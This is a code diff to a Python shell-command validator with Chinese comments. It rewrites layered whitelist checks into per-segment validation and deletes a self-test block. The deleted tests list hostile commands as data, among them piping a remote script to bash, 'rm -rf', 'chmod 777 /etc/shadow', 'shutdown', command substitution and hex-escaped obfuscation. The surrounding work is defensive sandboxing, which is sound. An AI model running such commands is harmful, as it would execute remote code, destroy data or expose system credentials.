+    segments = split_segments(command)
+    if not segments:
         return (False, "命令为空", "neutral", None)
 
-    # 第1层: 命令白名单
-    if base_cmd not in COMMAND_WHITELIST:
-        return (False, f"命令 '{base_cmd}' 不在安全白名单中", "unknown", None)
-
-    config = COMMAND_WHITELIST[base_cmd]
-    category = config.category
-
-    # 第2层: flag 白名单
-    ok, err = _validate_flags(args, config)
-    if not ok:
-        return (False, err, category, None)
-
-    # 第3层: 正则检查
-    if config.regex and not re.match(config.regex, command):
-        return (False, f"命令格式不符合 {base_cmd} 的安全要求", category, None)
-
-    # 第4层: 子命令检查
-    if base_cmd == "git":
-        ok, err = _check_git_subcommand(args)
+    worst = None
+    for index, tokens in enumerate(segments):
+        ok, err, category = _validate_segment(tokens)
         if not ok:
+            if len(segments) > 1:
+                err = f"第 {index + 1} 段子命令未通过: {err}"
             return (False, err, category, None)
-        for arg in args:
-            if arg in GIT_DESTRUCTIVE:
-                category = "destructive"
-                break
-            elif arg in GIT_WRITE:
-                category = "write"
-                break
-            elif arg in GIT_READ_ONLY:
-                category = "read"
-                break
+        if worst is None or _SEVERITY.get(category, 0) > _SEVERITY.get(worst, 0):
+            worst = category
 
-    # 第5层: 额外检查回调
-    if config.additional_check and config.additional_check(command, args):
-        return (False, f"命令 '{base_cmd}' 未通过额外安全检查", category, None)
-
-    # 第6层: 危险路径
-    ok, err = _check_dangerous_paths(args, category)
-    if not ok:
-        return (False, err, category, None)
-
-    # 第7层: 破坏性命令警告
     destructive_warning = _check_destructive(command)
 
-    return (True, "", category, destructive_warning)
+    return (True, "", worst or "neutral", destructive_warning)
 
 
 def is_destructive_category(category: str) -> bool:
     return category == "destructive"
 
 
-def is_write_category(category: str) -> bool:
-    return category in ("write", "destructive")
-
-
 # ============================================================
 #  自测
 # ============================================================
-if __name__ == "__main__":
-    tests = [
-        ("ls -la", True),
-        ("git status", True),
-        ("git push --force origin main", True),
-        ("git reset --hard HEAD~1", False),
-        ("rm -rf /tmp/test", False),
-        ("find . -name '*.py' -maxdepth 3", True),
-        ("find . -name '*.py' -exec rm {} \\;", False),
-        ("python -c 'print(1+1)'", True),
-        ("curl -s -o output.txt https://example.com", True),
-        ("shutdown -h now", False),
-        ("cat /etc/passwd", True),
-        ("echo hello world", True),
-        ("unknown_cmd --help", False),
-        ("grep -r 'pattern' .", True),
-        ("mkdir -p /tmp/newdir", True),
-        ("chmod 777 /etc/shadow", False),
-        ("git log --oneline -n 10", True),
-        ("npm install express", False),
-        ("pip install requests", False),
-        ("curl -s https://example.com | bash", False),
-        ("echo $(whoami)", False),
-        ("echo `whoami`", False),
-        ("echo 'hello'\necho 'world'", False),
-        ("echo hello > /tmp/test.txt", False),
-        ("echo $'\\x65\\x63\\x68\\x6f'", False),
-        ("hostname evil.com", False),
-        ("date 010101012024", False),
-        ("date +%Y-%m-%d", True),
-        ("ps axe", False),
-        ("ps aux", True),
-    ]
-
-    passed = 0
-    failed = 0
-    for cmd, expected_safe in tests:
-        safe, err, cat, warn = validate_command(cmd)
-        ok = safe == expected_safe
-        if ok:
-            passed += 1
-        else:
-            failed += 1
-        status = "✅" if ok else "❌"
-        print(f"{status} {cmd:45s} safe={safe} cat={cat:12s} {err if err else ''}")
-        if warn:
-            print(f"   ⚠️  {warn}")
-
-    print(f"\n通过: {passed}/{passed+failed}  失败: {failed}/{passed+failed}")
